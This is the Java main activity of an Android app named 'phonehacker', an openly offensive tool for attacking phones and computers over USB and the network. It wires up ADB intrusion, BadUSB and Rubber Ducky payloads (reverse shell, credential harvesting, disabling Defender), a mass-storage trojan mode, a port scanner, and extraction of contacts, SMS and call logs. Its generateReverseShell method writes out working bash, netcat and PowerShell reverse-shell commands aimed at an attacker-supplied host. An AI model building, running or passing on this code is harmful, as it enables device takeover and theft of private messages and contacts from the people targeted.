package com.offensive.phonehacker;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.view.View;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import android.content.pm.PackageManager;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.*;

public class MainActivity extends AppCompatActivity {
    
    private static final String ACTION_USB_PERMISSION = "com.offensive.phonehacker.USB_PERMISSION";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    // Core components
    private UsbManager usbManager;
    private UsbDevice targetDevice;
    private PendingIntent permissionIntent;
    private AdbHelper adbHelper;
    private DataExfiltrator dataExfiltrator;
    
    // Bad USB components
    private BadUsbAttack badUsbAttack;
    private UsbMassStorage massStorage;
    
    // UI - Attack Mode
    private Spinner attackModeSpinner;
    private LinearLayout adbSection, badUsbSection, duckySection, massStorageSection;
    
    // UI - ADB
    private Button usbAttackButton;
    
    // UI - Bad USB
    private Spinner badUsbPayloadSpinner;
    private EditText attackerIpEditText;
    private Button initHidButton, executeBadUsbButton;
    
    // UI - Rubber Ducky
    private Spinner duckyPayloadSpinner;
    private EditText customPayloadEditText;
    private Button loadPayloadButton, executeDuckyButton, stopDuckyButton;
    
    // UI - Mass Storage
    private Button initMassStorageButton, addTrojanButton, stopMassStorageButton;
    
    // UI - Network
    private EditText targetIpEditText, lhostEditText, lportEditText;
    private Button networkAttackButton, shellButton, dataExfilButton, clearLogButton;
    private TextView resultTextView;
    private ProgressBar progressBar;
    
    // Payload names
    private String[] duckyPayloads = {
        "reverse_shell_windows.txt",
        "wifi_exfil.txt",
        "info_gather.txt",
        "linux_reverse_shell.txt",
        "disable_defender.txt"
    };
    
    private final BroadcastReceiver usbReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (ACTION_USB_PERMISSION.equals(action)) {
                synchronized (this) {
                    UsbDevice device = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
                    if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
                        if (device != null) {
                            targetDevice = device;
                            appendLog("[+] USB Device Connected: " + device.getDeviceName());
                        }
                    } else {
                        appendLog("[-] USB Permission Denied");
                    }
                }
            } else if (UsbManager.ACTION_USB_DEVICE_ATTACHED.equals(action)) {
                UsbDevice device = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
                if (device != null) {
                    targetDevice = device;
                    usbManager.requestPermission(device, permissionIntent);
                }
            }
        }
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initializeUsb();
        initializeHelpers();
        initializeUi();
        setupListeners();
        requestPermissions();
        checkConnectedDevices();
    }
    
    private void initializeUsb() {
        usbManager = (UsbManager) getSystemService(Context.USB_SERVICE);
        permissionIntent = PendingIntent.getBroadcast(this, 0, 
            new Intent(ACTION_USB_PERMISSION), PendingIntent.FLAG_UPDATE_CURRENT);
        IntentFilter filter = new IntentFilter(ACTION_USB_PERMISSION);
        filter.addAction(UsbManager.ACTION_USB_DEVICE_ATTACHED);
        registerReceiver(usbReceiver, filter);
    }
    
    private void initializeHelpers() {
        adbHelper = new AdbHelper(usbManager);
        dataExfiltrator = new DataExfiltrator(this);
        badUsbAttack = new BadUsbAttack(this);
        massStorage = new UsbMassStorage(this);
        
        // Setup Bad USB callbacks
        badUsbAttack.setCallback(new BadUsbAttack.AttackCallback() {
            @Override
            public void onStatusUpdate(String status) {
                runOnUiThread(() -> appendLog("[STATUS] " + status));
            }
            @Override
            public void onProgress(int percent) {
                runOnUiThread(() -> {
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setProgress(percent);
                });
            }
            @Override
            public void onLogMessage(String message) {
                runOnUiThread(() -> appendLog(message));
            }
            @Override
            public void onAttackComplete(boolean success, String summary) {
                runOnUiThread(() -> {
                    progressBar.setVisibility(View.GONE);
                    appendLog("[COMPLETE] " + summary);
                });
            }
        });
        
        // Setup Mass Storage callbacks
        massStorage.setCallback(new UsbMassStorage.StatusCallback() {
            @Override
            public void onStatus(String message) {
                runOnUiThread(() -> appendLog("[STORAGE] " + message));
            }
            @Override
            public void onError(String error) {
                runOnUiThread(() -> appendLog("[STORAGE ERROR] " + error));
            }
        });
    }
    
    private void initializeUi() {
        // Attack mode selector
        attackModeSpinner = findViewById(R.id.attackModeSpinner);
        String[] modes = {"ADB Attack", "Bad USB HID", "Rubber Ducky", "Mass Storage"};
        attackModeSpinner.setAdapter(new ArrayAdapter<>(this, 
            android.R.layout.simple_spinner_dropdown_item, modes));
        
        // Sections
        adbSection = findViewById(R.id.adbSection);
        badUsbSection = findViewById(R.id.badUsbSection);
        duckySection = findViewById(R.id.duckySection);
        massStorageSection = findViewById(R.id.massStorageSection);
        
        // ADB UI
        usbAttackButton = findViewById(R.id.usbAttackButton);
        
        // Bad USB UI
        badUsbPayloadSpinner = findViewById(R.id.badUsbPayloadSpinner);
        String[] badUsbPayloads = {"Reverse Shell", "Credential Harvest", "Data Exfiltration", "Mouse Jiggler"};
        badUsbPayloadSpinner.setAdapter(new ArrayAdapter<>(this,
            android.R.layout.simple_spinner_dropdown_item, badUsbPayloads));
        attackerIpEditText = findViewById(R.id.attackerIpEditText);
        initHidButton = findViewById(R.id.initHidButton);
        executeBadUsbButton = findViewById(R.id.executeBadUsbButton);
        
        // Rubber Ducky UI
        duckyPayloadSpinner = findViewById(R.id.duckyPayloadSpinner);
        duckyPayloadSpinner.setAdapter(new ArrayAdapter<>(this,
            android.R.layout.simple_spinner_dropdown_item, duckyPayloads));
        customPayloadEditText = findViewById(R.id.customPayloadEditText);
        loadPayloadButton = findViewById(R.id.loadPayloadButton);
        executeDuckyButton = findViewById(R.id.executeDuckyButton);
        stopDuckyButton = findViewById(R.id.stopDuckyButton);
        
        // Mass Storage UI
        initMassStorageButton = findViewById(R.id.initMassStorageButton);
        addTrojanButton = findViewById(R.id.addTrojanButton);
        stopMassStorageButton = findViewById(R.id.stopMassStorageButton);
        
        // Network UI
        targetIpEditText = findViewById(R.id.targetIpEditText);
        lhostEditText = findViewById(R.id.lhostEditText);
        lportEditText = findViewById(R.id.lportEditText);
        networkAttackButton = findViewById(R.id.networkAttackButton);
        shellButton = findViewById(R.id.shellButton);
        dataExfilButton = findViewById(R.id.dataExfilButton);
        clearLogButton = findViewById(R.id.clearLogButton);
        resultTextView = findViewById(R.id.resultTextView);
        progressBar = findViewById(R.id.progressBar);
        
        // Set defaults
        targetIpEditText.setText("192.168.43.1");
        lhostEditText.setText("192.168.43.100");
        lportEditText.setText("4444");
        attackerIpEditText.setText("192.168.43.100");
    }
    
    private void setupListeners() {
        // Attack mode selector
        attackModeSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                adbSection.setVisibility(position == 0 ? View.VISIBLE : View.GONE);
                badUsbSection.setVisibility(position == 1 ? View.VISIBLE : View.GONE);
                duckySection.setVisibility(position == 2 ? View.VISIBLE : View.GONE);
                massStorageSection.setVisibility(position == 3 ? View.VISIBLE : View.GONE);
            }
            @Override
            public void onNothingSelected(AdapterView<?> parent) {}
        });
        
        // ADB Attack
        usbAttackButton.setOnClickListener(v -> {
            if (targetDevice != null) {
                new Thread(() -> {
                    final String result = executeUsbAttack();
                    runOnUiThread(() -> appendLog(result));
                }).start();
            } else {
                appendLog("[-] No USB device connected.\n[!] Connect target via USB OTG.");
            }
        });
        
        // Bad USB - Initialize HID
        initHidButton.setOnClickListener(v -> {
            appendLog("[*] Initializing USB HID...");
            new Thread(() -> {
                boolean success = badUsbAttack.initialize();
                runOnUiThread(() -> {
                    if (success) {
                        appendLog("[+] USB HID initialized successfully");
                        appendLog("[*] Device ready for HID attacks");
                    } else {
                        appendLog("[-] USB HID initialization failed");
                        appendLog("[!] Root access may be required");
                    }
                });
            }).start();
        });
        
        // Bad USB - Execute Attack
        executeBadUsbButton.setOnClickListener(v -> {
            int selection = badUsbPayloadSpinner.getSelectedItemPosition();
            String attackerIp = attackerIpEditText.getText().toString();
            
            BadUsbAttack.AttackType type;
            switch (selection) {
                case 0: type = BadUsbAttack.AttackType.REVERSE_SHELL; break;
                case 1: type = BadUsbAttack.AttackType.CREDENTIAL_HARVEST; break;
                case 2: type = BadUsbAttack.AttackType.EXFILTRATION; break;
                case 3: type = BadUsbAttack.AttackType.MOUSE_JIGGLER; break;
                default: type = BadUsbAttack.AttackType.REVERSE_SHELL;
            }
            
            appendLog("[*] Starting " + type.name() + " attack...");
            progressBar.setVisibility(View.VISIBLE);
            progressBar.setProgress(0);
            badUsbAttack.executeAttack(type, attackerIp);
        });
        
        // Rubber Ducky - Load Payload
        loadPayloadButton.setOnClickListener(v -> {
            String payloadName = duckyPayloads[duckyPayloadSpinner.getSelectedItemPosition()];
            try {
                InputStream is = getAssets().open("payloads/" + payloadName);
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                reader.close();
                customPayloadEditText.setText(sb.toString());
                appendLog("[+] Loaded payload: " + payloadName);
            } catch (IOException e) {
                appendLog("[-] Failed to load payload: " + e.getMessage());
            }
        });
        
        // Rubber Ducky - Execute
        executeDuckyButton.setOnClickListener(v -> {
            String script = customPayloadEditText.getText().toString();
            if (script.isEmpty()) {
                appendLog("[-] No payload script entered");
                return;
            }
            
            // Replace ATTACKER_IP placeholder
            String attackerIp = lhostEditText.getText().toString();
            script = script.replace("ATTACKER_IP", attackerIp);
            
            appendLog("[*] Executing DuckyScript payload...");
            progressBar.setVisibility(View.VISIBLE);
            progressBar.setProgress(0);
            badUsbAttack.executeCustomPayload(script);
        });
        
        // Rubber Ducky - Stop
        stopDuckyButton.setOnClickListener(v -> {
            badUsbAttack.stopAttack();
            appendLog("[!] Execution stopped");
            progressBar.setVisibility(View.GONE);
        });
        
        // Mass Storage - Initialize
        initMassStorageButton.setOnClickListener(v -> {
            appendLog("[*] Initializing USB Mass Storage...");
            new Thread(() -> {
                boolean success = massStorage.initialize();
                runOnUiThread(() -> {
                    if (success) {
                        appendLog("[+] Mass Storage active");
                        appendLog("[*] Device appears as USB drive");
                    } else {
                        appendLog("[-] Failed to initialize mass storage");
                    }
                });
            }).start();
        });
        
        // Mass Storage - Add Trojan
        addTrojanButton.setOnClickListener(v -> {
            new Thread(() -> {
                boolean success = massStorage.addTrojanDocument("doc");
                runOnUiThread(() -> {
                    if (success) {
                        appendLog("[+] Trojan document structure added");
                    } else {
                        appendLog("[-] Failed to add trojan");
                    }
                });
            }).start();
        });
        
        // Mass Storage - Stop
        stopMassStorageButton.setOnClickListener(v -> {
            massStorage.stop();
            appendLog("[*] Mass storage stopped");
        });
        
        // Network Attack
        networkAttackButton.setOnClickListener(v -> {
            String target = targetIpEditText.getText().toString();
            new Thread(() -> {
                final String result = networkScan(target);
                runOnUiThread(() -> appendLog(result));
            }).start();
        });
        
        // Reverse Shell
        shellButton.setOnClickListener(v -> {
            String lhost = lhostEditText.getText().toString();
            String lport = lportEditText.getText().toString();
            appendLog(generateReverseShell(lhost, lport));
        });
        
        // Data Exfiltration
        dataExfilButton.setOnClickListener(v -> {
            new Thread(() -> {
                final String result;
                if (targetDevice != null && adbHelper.isConnected()) {
                    result = exfiltrateDataViaUsb();
                } else {
                    result = extractLocalData();
                }
                runOnUiThread(() -> appendLog(result));
            }).start();
        });
        
        // Clear Log
        clearLogButton.setOnClickListener(v -> resultTextView.setText(""));
    }
    
    private void appendLog(String message) {
        String current = resultTextView.getText().toString();
        resultTextView.setText(current + message + "\n");
        // Scroll to bottom
        final ScrollView sv = (ScrollView) resultTextView.getParent().getParent();
        sv.post(() -> sv.fullScroll(View.FOCUS_DOWN));
    }
    
    private void requestPermissions() {
        List<String> perms = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            perms.add(Manifest.permission.READ_CONTACTS);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            perms.add(Manifest.permission.READ_SMS);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            perms.add(Manifest.permission.READ_CALL_LOG);
        if (!perms.isEmpty())
            ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }
    
    private void checkConnectedDevices() {
        HashMap<String, UsbDevice> devices = usbManager.getDeviceList();
        if (!devices.isEmpty()) {
            for (UsbDevice device : devices.values()) {
                targetDevice = device;
                usbManager.requestPermission(device, permissionIntent);
                break;
            }
        }
    }
    
    private String executeUsbAttack() {
        StringBuilder result = new StringBuilder();
        result.append("=== USB ADB Attack ===\n");
        result.append("Target: ").append(targetDevice.getDeviceName()).append("\n\n");
        
        try {
            result.append("[*] Connecting via ADB protocol...\n");
            if (adbHelper.connect(targetDevice)) {
                result.append("[+] ADB connection established!\n");
                result.append(adbHelper.getDeviceInfo()).append("\n");
                result.append("[*] Root: ").append(adbHelper.isRooted() ? "YES" : "NO").append("\n");
            } else {
                result.append("[-] ADB connection failed\n");
            }
        } catch (Exception e) {
            result.append("[-] Error: ").append(e.getMessage()).append("\n");
        }
        return result.toString();
    }
    
    private String exfiltrateDataViaUsb() {
        StringBuilder r = new StringBuilder("=== USB Data Exfiltration ===\n\n");
        try {
            r.append("[*] Extracting contacts...\n").append(adbHelper.dumpContacts()).append("\n");
            r.append("[*] Extracting SMS...\n").append(adbHelper.dumpSms()).append("\n");
            r.append("[*] Extracting call logs...\n").append(adbHelper.dumpCallLog()).append("\n");
        } catch (Exception e) {
            r.append("[-] Error: ").append(e.getMessage());
        }
        return r.toString();
    }
    
    private String extractLocalData() {
        StringBuilder r = new StringBuilder("=== Local Data Extraction ===\n\n");
        r.append("[*] Contacts:\n").append(dataExfiltrator.formatContactsAsString()).append("\n");
        r.append("[*] SMS:\n").append(dataExfiltrator.formatSmsAsString()).append("\n");
        r.append("[*] Call Logs:\n").append(dataExfiltrator.formatCallLogsAsString()).append("\n");
        return r.toString();
    }
    
    private String networkScan(String target) {
        StringBuilder r = new StringBuilder("=== Network Scan: " + target + " ===\n\n");
        int[] ports = {21, 22, 23, 80, 443, 4444, 5555, 8080};
        String[] svcs = {"FTP", "SSH", "Telnet", "HTTP", "HTTPS", "Shell", "ADB", "Proxy"};
        int open = 0;
        for (int i = 0; i < ports.length; i++) {
            try {
                Socket s = new Socket();
                s.connect(new InetSocketAddress(target, ports[i]), 1000);
                s.close();
                r.append("[+] ").append(ports[i]).append(" OPEN - ").append(svcs[i]).append("\n");
                open++;
            } catch (Exception e) {}
        }
        r.append("\n[*] ").append(open).append(" open ports found\n");
        return r.toString();
    }
    
    private String generateReverseShell(String lhost, String lport) {
        return "=== Reverse Shell Payloads ===\n\n" +
            "Bash: bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1\n\n" +
            "NC: nc -e /bin/sh " + lhost + " " + lport + "\n\n" +
            "PowerShell: powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('" + 
            lhost + "'," + lport + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};" +
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding)." +
            "GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII)." +
            "GetBytes($r);$s.Write($sb,0,$sb.Length)}\"\n";
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        try { unregisterReceiver(usbReceiver); } catch (Exception e) {}
        if (adbHelper != null) adbHelper.disconnect();
        if (badUsbAttack != null) badUsbAttack.close();
        if (massStorage != null) massStorage.stop();
    }
}
